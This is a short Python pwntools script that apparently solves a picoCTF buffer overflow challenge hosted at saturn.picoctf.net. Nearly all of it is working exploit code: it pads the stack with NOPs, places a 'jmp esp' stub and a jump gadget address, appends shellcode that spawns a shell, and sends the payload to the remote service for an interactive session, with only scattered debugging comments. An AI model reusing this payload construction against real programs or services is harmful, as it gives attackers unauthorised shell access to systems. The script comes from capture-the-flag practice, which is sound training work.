from pwn import *
elf = ELF('/home/kali/Downloads/vuln')
p=elf.process()
p=remote('saturn.picoctf.net', 53841)

#gdb.attach(p, gdbscript='b* 0x8049DBC')

jmp_eax = p32(0x805333b)

payload = b'\x90'*26
payload += asm('jmp esp')
#payload = shell.ljust(28, b'\x90')
#payload = b'A'*24 +b'C'*4 + b'D'*4 si d e rip
#mb 



payload += jmp_eax
#this will become esp after we jmp eax.
newshell = asm(shellcraft.sh())
payload +=newshell

p.sendline(payload)

p.interactive()
#padding to rbp, then rbp
